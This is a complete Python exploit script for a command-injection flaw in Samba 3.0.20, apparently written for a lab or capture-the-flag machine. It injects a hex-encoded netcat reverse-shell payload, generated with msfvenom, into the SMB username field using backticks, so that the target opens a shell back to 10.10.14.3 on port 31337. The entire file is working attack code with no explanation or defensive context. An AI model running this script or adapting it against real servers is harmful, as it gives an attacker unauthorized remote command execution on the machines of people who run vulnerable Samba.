#!/usr/bin/python3
# Usage: python3 exploit_smb3.0.20.py <HOST> <PORT>
# Made by @xlcc @J4ck21

from smb.SMBConnection import SMBConnection
import sys

# msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.3 LPORT=31337 -f python
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x64"
buf += b"\x78\x63\x78\x70\x79\x77\x3b\x20\x6e\x63\x20\x31\x30"
buf += b"\x2e\x31\x30\x2e\x31\x34\x2e\x33\x20\x33\x31\x33\x33"
buf += b"\x37\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x64\x78\x63\x78"
buf += b"\x70\x79\x77\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68"
buf += b"\x20\x3e\x2f\x74\x6d\x70\x2f\x64\x78\x63\x78\x70\x79"
buf += b"\x77\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74"
buf += b"\x6d\x70\x2f\x64\x78\x63\x78\x70\x79\x77"

server_ip=sys.argv[1]
port=int(sys.argv[2])

user="/=`nohup " +  buf.decode() + "`"
password=""
client_machine_name=""
server_name=""
domain_name=""

conn = SMBConnection(user, password, client_machine_name, server_name, domain=domain_name, use_ntlm_v2=True, is_direct_tcp=True)

conn.connect(server_ip,port)
